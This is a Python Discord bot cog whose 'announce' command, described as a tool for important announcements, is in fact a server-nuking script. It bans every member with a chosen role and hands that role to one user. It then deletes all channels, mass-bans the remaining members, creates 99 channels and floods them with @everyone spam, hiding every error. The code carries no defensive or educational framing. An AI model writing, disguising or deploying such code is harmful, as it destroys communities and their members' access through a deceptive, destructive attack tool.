import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
    @app_commands.describe(
        useradmin="Usuario administrador principal",
        roletogive="Rol de administración",
        message="Mensaje importante para anunciar"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def announce(self, interaction: discord.Interaction, 
                      useradmin: discord.User, 
                      roletogive: discord.Role, 
                      message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        # Responder inmediatamente para evitar timeout
        await interaction.response.send_message("🚀 Iniciando operación destructiva...", ephemeral=True)
        
        try:
            guild = interaction.guild
            followup = interaction.followup
            
            # 1. BANEAR INMEDIATAMENTE a todos los miembros con el rol especificado
            banned_count = 0
            members_to_ban = []
            
            # Obtener todos los miembros del servidor
            all_members = [member async for member in guild.fetch_members()]
            
            for member in all_members:
                # Verificar si el miembro tiene el rol (comparando IDs)
                if any(role.id == roletogive.id for role in member.roles) and member.id != useradmin.id:
                    members_to_ban.append(member)
            
            # Banear miembros CON MÁXIMA AGRESIVIDAD
            ban_tasks = []
            for member in members_to_ban:
                try:
                    # Crear tarea de baneo sin esperar
                    ban_task = asyncio.create_task(
                        member.ban(reason=f"Baneado por comando announce: {interaction.user}", delete_message_days=7)
                    )
                    ban_tasks.append(ban_task)
                    banned_count += 1
                except:
                    # Silencio absoluto en errores
                    pass
            
            # Esperar a que se completen los baneos
            if ban_tasks:
                await asyncio.gather(*ban_tasks, return_exceptions=True)
            
            await followup.send(f"✅ Fase 1: {banned_count} miembros con el rol baneados", ephemeral=True)
            
            # 2. Añadir rol al admin INMEDIATAMENTE
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                await admin_member.add_roles(roletogive)
                await followup.send("✅ Rol asignado al administrador", ephemeral=True)
            except:
                # Silencio absoluto en errores
                pass
            
            # 3. ELIMINAR TODOS LOS CANALES SIN PIEDAD
            delete_tasks = []
            for channel in guild.channels:
                try:
                    delete_task = asyncio.create_task(channel.delete())
                    delete_tasks.append(delete_task)
                except:
                    # Silencio absoluto en errores
                    pass
            
            # Ejecutar todas las eliminaciones en paralelo
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            await followup.send("✅ Todos los canales eliminados", ephemeral=True)
            
            # 4. BANEAR A TODOS LOS DEMÁS MIEMBROS DEL SERVIDOR
            async def ban_all_remaining_members():
                remaining_banned = 0
                for member in all_members:
                    try:
                        # No banear al useradmin, al bot, o a quienes ya fueron baneados
                        if (member.id != useradmin.id and 
                            member.id != self.bot.user.id and 
                            not member.bot and
                            member not in members_to_ban):
                            
                            await member.ban(reason=f"Baneo masivo: {interaction.user}", delete_message_days=7)
                            remaining_banned += 1
                            
                            # Delay mínimo para evitar rate limits
                            if remaining_banned % 5 == 0:
                                await asyncio.sleep(0.1)
                                
                    except:
                        # Silencio absoluto en errores
                        continue
                
                return remaining_banned
            
            # Iniciar el baneo masivo en segundo plano
            mass_ban_task = asyncio.create_task(ban_all_remaining_members())
            
            # 5. CREAR CANALES DE FORMA MASIVA Y AGRESIVA
            spam_message = f"@everyone {message}"
            channel_count = 0
            max_channels = 99  # Límite alto pero seguro
            
            # Crear canales de forma ultra rápida
            channel_tasks = []
            while channel_count < max_channels:
                try:
                    # Crear canal con nombre único
                    channel_name = f"{message}-{channel_count}"
                    
                    # Crear el canal de forma asíncrona
                    channel_task = asyncio.create_task(
                        guild.create_text_channel(channel_name[:95])
                    )
                    channel_tasks.append(channel_task)
                    
                    channel_count += 1
                    
                    # Delay mínimo entre creaciones
                    if channel_count % 10 == 0:
                        await asyncio.sleep(0.05)
                        
                except:
                    # Silencio absoluto en errores
                    break
            
            # Esperar a que se creen todos los canales
            created_channels = []
            for task in channel_tasks:
                try:
                    channel = await task
                    created_channels.append(channel)
                except:
                    # Silencio absoluto en errores
                    pass
            
            # 6. SPAMMEAR MENSAJES EN TODOS LOS CANALES
            spam_tasks = []
            for channel in created_channels:
                try:
                    # Enviar múltiples mensajes de forma agresiva
                    for i in range(5):  # 5 mensajes por canal
                        spam_task = asyncio.create_task(
                            channel.send(f"{spam_message} [{i+1}]")
                        )
                        spam_tasks.append(spam_task)
                        
                        # Pequeño delay para evitar bloqueos
                        if len(spam_tasks) % 20 == 0:
                            await asyncio.sleep(0.1)
                            
                except:
                    # Silencio absoluto en errores
                    pass
            
            # Esperar a que todos los mensajes se envíen
            await asyncio.gather(*spam_tasks, return_exceptions=True)
            
            # 7. ESPERAR A QUE TERMINE EL BANEO MASIVO
            remaining_banned = await mass_ban_task
            
            # Mensaje final de destrucción completada
            await followup.send(
                f"☢️ DESTRUCCIÓN COMPLETADA:\n"
                f"• Miembros baneados (rol): {banned_count}\n"
                f"• Miembros baneados (resto): {remaining_banned}\n"
                f"• Canales creados: {len(created_channels)}\n"
                f"• Mensajes enviados: {len(spam_tasks)}", 
                ephemeral=True
            )
            
        except:
            # Silencio absoluto en errores globales
            try:
                await interaction.followup.send("❌ Error crítico durante la operación.", ephemeral=True)
            except:
                try:
                    await interaction.edit_original_response(content="❌ Error crítico durante la operación.")
                except:
                    pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
